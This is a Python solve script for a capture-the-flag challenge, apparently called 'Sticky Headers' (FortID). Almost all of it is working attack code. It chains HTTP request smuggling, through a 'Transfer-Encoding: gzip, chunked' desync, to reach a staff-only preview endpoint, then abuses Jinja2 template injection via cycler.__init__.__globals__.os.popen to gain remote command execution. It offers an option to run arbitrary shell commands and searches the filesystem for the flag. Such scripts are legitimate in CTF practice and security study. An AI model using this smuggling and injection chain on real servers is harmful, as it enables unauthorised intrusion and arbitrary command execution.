#!/usr/bin/env python3
"""Sticky Headers (FortID) - HTTP request smuggling + Jinja2 SSTI, flag read.

The public /order endpoint accepts a legacy client ("X-Client-Version: 1") with a
composite "Transfer-Encoding: gzip, chunked"; the front proxy and the internal
service disagree about the body, so a second HTTP request smuggled in the same
connection reaches the staff-only /staff/preview, which renders our message as a
Jinja2 template. From there it is a plain cycler.__init__.__globals__.os.popen RCE.

Usage:
    python3 solve.py <host> [port]                      # full chain, flag
    python3 solve.py <host> --expr '{{7*7}}'            # one template probe
    python3 solve.py <host> --cmd 'id'                  # one shell command
"""

import argparse
import re
import socket
import ssl
import sys
import urllib.parse

PREVIEW_RE = re.compile(rb'<div class="preview">(.*?)</div>', re.S)
FLAG_RE = re.compile(r"FortID\{[^}]{0,200}\}")


def build_request(host, message):
    """The exact two-request-on-one-connection payload (byte-for-byte from probe #070)."""
    data = urllib.parse.urlencode({"message": message}).encode()
    outer = (
        f"POST /order HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-Client-Version: 1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: keep-alive\r\n"
        f"Transfer-Encoding: gzip, chunked\r\n"
        f"\r\n"
        f"B\r\norder=hello\r\n0\r\n\r\n"
    ).encode()
    inner = (
        f"POST /staff/preview HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"X-Client-Version: 1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"\r\n"
    ).encode() + data
    return outer + inner


def send(host, port, payload, timeout=8.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=timeout) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ss:
            ss.settimeout(4)
            ss.sendall(payload)
            raw = b""
            try:
                while True:
                    chunk = ss.recv(65536)
                    if not chunk:
                        break
                    raw += chunk
            except (socket.timeout, ssl.SSLError, OSError):
                pass
    return raw


def preview(host, port, message):
    """Render `message` on the smuggled /staff/preview and return the preview text."""
    raw = send(host, port, build_request(host, message))
    match = PREVIEW_RE.search(raw)
    return match.group(1).decode("utf-8", "replace") if match else None


def rce(host, port, command):
    expr = '{{cycler.__init__.__globals__.os.popen("' + command + '").read()}}'
    return preview(host, port, expr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", nargs="?", type=int, default=1337)
    ap.add_argument("--expr", help="render a single template expression")
    ap.add_argument("--cmd", help="run a single shell command through os.popen")
    args = ap.parse_args()

    if args.expr:
        print(preview(args.host, args.port, args.expr))
        return 0
    if args.cmd:
        print(rce(args.host, args.port, args.cmd))
        return 0

    control = preview(args.host, args.port, "{{7*7}}")
    print(f"[*] smuggling control ({{{{7*7}}}}) - {control!r}")
    if control != "49":
        print("[!] the smuggled request did not reach the template renderer")
        return 1

    found = rce(args.host, args.port, "find / -name recipe.txt")
    print(f"[*] find / -name recipe.txt - {found!r}")

    paths = [p for p in (found or "").split() if p.endswith("recipe.txt")]
    for path in paths:
        out = rce(args.host, args.port, f"cat {path}")
        print(f"[*] cat {path} - {out!r}")
        flag = FLAG_RE.search(out or "")
        if flag:
            print(f"\nFLAG: {flag.group(0)}")
            return 0

    print("[!] no flag in the rendered output")
    return 1


if __name__ == "__main__":
    sys.exit(main())
